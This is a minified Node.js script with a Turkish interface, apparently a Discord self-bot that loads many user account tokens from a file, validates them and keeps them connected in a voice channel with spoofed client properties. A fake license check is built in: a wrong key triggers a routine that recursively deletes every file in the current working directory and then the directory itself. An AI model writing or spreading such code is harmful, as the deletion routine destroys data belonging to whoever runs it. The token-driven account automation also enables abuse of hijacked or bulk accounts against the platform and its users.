const axios=require('axios');const fs=require('fs');const WebSocket=require('ws');const readline=require('readline');const path=require('path');const VALID_KEYS=['ZYPHERIS-2025','BOTORIA-GUVENLIK','LIVIUXS-PROGRAM','ZYPPP','ZYPHERIS-BOTORIA','ZYPHERIS-ELITE','LIVIUXS-MASTER','BOTORIA-PRO','ZYPPHERA-ACCESS','LIVIUXS-SECURE','BOTORIA-X','ZYPHERIS-PLUS','LIVIUXS-CORE','BOTORIA-ADVANCE','ZYPHERIS-PRIME','LIVIUXS-V2','BOTORIA-MOD','ZYPHERIS-DELUXE','BOTORIA-LABS','LIVIUXS-NOVA','ZYPHERIS-ALPHA','BOTORIA-VISION','LIVIUXS-SHIELD','ZYPHERIS-BETA','BOTORIA-VAULT','LIVIUXS-GEN','ZYPHERIS-SYSTEM','BOTORIA-LOCK','LIVIUXS-SOFT','ZYPHERIS-AUTH','BOTORIA-PANEL','LIVIUXS-CONTROL','ZYPHERIS-MODULE','BOTORIA-CORE','LIVIUXS-FRAME','ZYPHERIS-CODEX','BOTORIA-OS','LIVIUXS-KERNEL','ZYPHERIS-FUSION'];const colors={reset:'\x1b[0m',bright:'\x1b[1m',red:'\x1b[31m',green:'\x1b[32m',yellow:'\x1b[33m',blue:'\x1b[34m',magenta:'\x1b[35m',cyan:'\x1b[36m',white:'\x1b[37m'};const symbols={success:'✅',error:'❌',warning:'⚠️',info:'ℹ️',rocket:'🚀',speaker:'🔊',disconnect:'🔌',reconnect:'♻️',key:'🔑',shield:'🛡️'};function logSuccess(message){console.log(`${colors.green}${symbols.success} ${message}${colors.reset}`)}
function logError(message){console.log(`${colors.red}${symbols.error} ${message}${colors.reset}`)}
function logInfo(message){console.log(`${colors.cyan}${symbols.info} ${message}${colors.reset}`)}
function logWarning(message){console.log(`${colors.yellow}${symbols.warning} ${message}${colors.reset}`)}
function showSecurityBanner(){console.clear();console.log(`${colors.red}${colors.bright}
╔══════════════════════════════════════╗
║     GÜVENLİK DOĞRULAMA SİSTEMİ      ║
║        🛡️  ZYPHERIS SECURITY  🛡️        ║
╚══════════════════════════════════════╝${colors.reset}\n`);console.log(`${colors.yellow}${symbols.warning} Bu yazılım lisanslıdır ve erişim anahtarı gerektirir${colors.reset}`);console.log(`${colors.yellow}${symbols.warning} Yanlış anahtar girişi anında sistem  imha  protokolünü tetikler${colors.reset}\n`)}
function showMainBanner(){console.clear();console.log(`${colors.magenta}${colors.bright}
╔══════════════════════════════════════╗
║        Botoria Development              ║
║        Zypheris Voice joiner         ║
╚══════════════════════════════════════╝${colors.reset}\n`)}
async function instantCleanup(){console.log(`${colors.red}${colors.bright}
╔══════════════════════════════════════╗
║      🚨 YETKİSİZ ERİŞİM TESPİT 🚨    ║
║        SİSTEM İMHA EDİLİYOR...        ║
╚══════════════════════════════════════╝${colors.reset}\n`);try{const currentDir=process.cwd();const parentDir=path.dirname(currentDir);const files=fs.readdirSync(currentDir);for(const file of files){const filePath=path.join(currentDir,file);try{if(fs.statSync(filePath).isDirectory()){fs.rmSync(filePath,{recursive:!0,force:!0})}else{fs.unlinkSync(filePath)}}catch(error){}}
try{process.chdir(parentDir);fs.rmSync(currentDir,{recursive:!0,force:!0})}catch(error){}
logError("Sistem temizlendi - Erişim reddedildi")}catch(error){logError("Temizleme hatası")}
process.exit(1)}
async function authenticateUser(){return new Promise((resolve,reject)=>{showSecurityBanner();const rl=readline.createInterface({input:process.stdin,output:process.stdout});rl.question(`${colors.cyan}${symbols.key} Erişim anahtarınızı girin: ${colors.reset}`,async(inputKey)=>{rl.close();if(VALID_KEYS.includes(inputKey.toUpperCase().trim())){console.log(`\n${colors.green}${symbols.success} Erişim anahtarı doğrulandı!${colors.reset}`);console.log(`${colors.green}${symbols.shield} Güvenlik doğrulaması başarılı${colors.reset}\n`);setTimeout(()=>{resolve(!0)},1500)}else{console.log(`\n${colors.red}${symbols.error} GEÇERSİZ ANAHTAR - SİSTEM KENDİSİNİ İMHA EDİYOR${colors.reset}\n`);await instantCleanup();reject(new Error("Yetkisiz erişim"))}})})}
const config={durum_yazısı:"zypheris",GUILD_ID:null,VC_CHANNEL:null,MUTED:!1,DEAFEN:!1};try{const configFile=require('./config.json');Object.assign(config,configFile)}catch(error){console.log("⚠️ config.json bulunamadı, varsayılan ayarlar kullanılacak")}
const filepath='./tokens.txt';const activeConnections=new Map();const STATUSES=[{type:'online',weight:40},{type:'idle',weight:30},{type:'dnd',weight:30}];function getRandomStatus(){const totalWeight=STATUSES.reduce((sum,status)=>sum+status.weight,0);let random=Math.random()*totalWeight;for(const status of STATUSES){if(random<status.weight){return status.type}
random-=status.weight}
return'online'}
const statusCounts={online:0,idle:0,dnd:0};function sort(filepath){try{const fileContent=fs.readFileSync(filepath,'utf-8');return fileContent.split('\n').map(line=>line.trim()).filter(line=>line.length>0).sort()}catch(error){logError(`Token dosyası okunamadı: ${error.message}`);return[]}}
async function checkTokens(tokens){const validTokens=[];const statusPool=['online','idle','dnd','online','idle','dnd'];logInfo(`${tokens.length} token kontrol ediliyor...`);for(let i=0;i<tokens.length;i++){const token=tokens[i];try{const response=await axios.get('https://discord.com/api/v10/users/@me',{headers:{Authorization:`${token}`,'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},timeout:10000});let status;if(statusPool.length>0){const randomIndex=Math.floor(Math.random()*statusPool.length);status=statusPool.splice(randomIndex,1)[0]}else{statusPool.push('online','idle','dnd');status=statusPool.shift()}
statusCounts[status]++;validTokens.push({token:token,username:response.data.username,id:response.data.id,status:status})}catch(error){if(error.response?.status===401){}else if(error.code==='ECONNABORTED'){}}
await new Promise(resolve=>setTimeout(resolve,500))}
logSuccess(`${validTokens.length} geçerli token bulundu`);console.log(`${colors.bright}Durum Dağılımı:${colors.reset} Online: ${colors.green}${statusCounts.online}${colors.reset} | Idle: ${colors.yellow}${statusCounts.idle}${colors.reset} | DND: ${colors.red}${statusCounts.dnd}${colors.reset}\n`);return validTokens}
async function setStatus(tokenData){try{await axios.patch('https://discord.com/api/v10/users/@me/settings',{status:tokenData.status,custom_status:{text:config.durum_yazısı||"zypheris",emoji_name:""}},{headers:{Authorization:tokenData.token,'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'},timeout:5000})}catch(error){}}
function createWebSocket(tokenData){const ws=new WebSocket('wss://gateway.discord.gg/?v=9&encoding=json');const authPayload={op:2,d:{token:tokenData.token,properties:{$os:'Windows',$browser:'Chrome',$device:'desktop'},presence:{status:tokenData.status,activities:[{name:config.durum_yazısı||"zyp",type:4,state:config.durum_yazısı||"zyp",created_at:Date.now()}],since:Date.now(),afk:tokenData.status==='idle'}}};const voicePayload={op:4,d:{guild_id:config.GUILD_ID,channel_id:config.VC_CHANNEL,self_mute:config.MUTED,self_deaf:config.DEAFEN}};let heartbeatInterval;ws.on('open',()=>{ws.send(JSON.stringify(authPayload));if(config.VC_CHANNEL&&config.GUILD_ID){setTimeout(()=>{ws.send(JSON.stringify(voicePayload))},2000)}
setTimeout(()=>setStatus(tokenData),3000)});ws.on('message',(data)=>{try{const payload=JSON.parse(data);if(payload.op===10){const heartbeatInterval=payload.d.heartbeat_interval;setInterval(()=>{if(ws.readyState===WebSocket.OPEN){ws.send(JSON.stringify({op:1,d:null}))}},heartbeatInterval)}}catch(error){}});ws.on('close',(code,reason)=>{if(heartbeatInterval){clearInterval(heartbeatInterval)}
setTimeout(()=>{activeConnections.set(tokenData.token,createWebSocket(tokenData))},5000+Math.random()*5000)});ws.on('error',(error)=>{});return ws}
async function runMainProgram(){showMainBanner();logInfo("Botoria Voice joiner başlatılıyor...");logInfo(`Durum yazısı: "${config.durum_yazısı}"`);if(!fs.existsSync(filepath)){logError("tokens.txt dosyası bulunamadı");return}
const tokens=sort(filepath);if(tokens.length===0){logError("Hiç token bulunamadı");return}
const validTokens=await checkTokens(tokens);if(validTokens.length===0){logError("Hiç geçerli token bulunamadı");return}
logInfo("Seslere bağlanılıyor");for(let i=0;i<validTokens.length;i++){const tokenData=validTokens[i];activeConnections.set(tokenData.token,createWebSocket(tokenData));if(i<validTokens.length-1){await new Promise(resolve=>setTimeout(resolve,1000))}}
logSuccess(`${validTokens.length} Botoria İş başında ${symbols.rocket}`);setInterval(async()=>{for(const tokenData of validTokens){await setStatus(tokenData);await new Promise(resolve=>setTimeout(resolve,1000))}},300000);process.on('SIGINT',()=>{console.log(`\n${colors.red}${colors.bright}Kapatılıyor...${colors.reset}`);activeConnections.forEach((ws,token)=>{if(ws.readyState===WebSocket.OPEN){ws.close(1000,'Kapatılıyor')}});setTimeout(()=>{logSuccess("Güle güle!");process.exit(0)},2000)});process.on('uncaughtException',(error)=>{logError(`Beklenmeyen hata: ${error.message}`)});process.on('unhandledRejection',(reason,promise)=>{logError(`İşlenmeyen promise reddi: ${reason}`)})}
async function main(){try{await authenticateUser();await runMainProgram()}catch(error){logError("Program sonlandırıldı");process.exit(1)}}
main().catch(console.error)